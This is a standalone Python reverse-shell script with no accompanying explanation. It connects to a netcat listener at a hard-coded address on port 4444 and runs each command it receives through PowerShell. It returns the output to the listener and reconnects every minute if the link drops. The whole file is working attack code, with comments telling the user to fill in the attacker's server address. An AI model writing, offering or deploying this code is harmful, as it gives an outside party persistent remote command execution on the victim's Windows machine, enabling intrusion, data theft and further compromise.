import socket
import subprocess
import time

def connect(server_ip, server_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))
        return s
    except Exception as e:
        print("Error:", e)
        return None

def main():
    server_ip = '192.168.1.193'  # Replace with the netcat server's IP address
    server_port = 4444       # Replace with the same port number used on the server

    while True:
        connection = connect(server_ip, server_port)
        if connection:
            try:
                # Initial setup commands
                initial_commands = [
                    "New-Item -ItemType Directory -Path 'C:\\scripts'",
                    "Set-Location 'C:\\scripts'"
                ]

                for cmd in initial_commands:
                    connection.send(cmd.encode())
                    output = connection.recv(1024).decode()
                    print(output)  # Print command output
                
                while True:
                    command = connection.recv(1024).decode()
                    if command.lower() == 'exit':
                        connection.close()
                        break
                    else:
                        output = subprocess.Popen(["powershell", command], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_data, stderr_data = output.communicate()
                        connection.send(stdout_data + stderr_data)
            except Exception:
                connection.close()
        time.sleep(60)  # Wait for 1 minute before attempting to reconnect

if __name__ == "__main__":
    main()
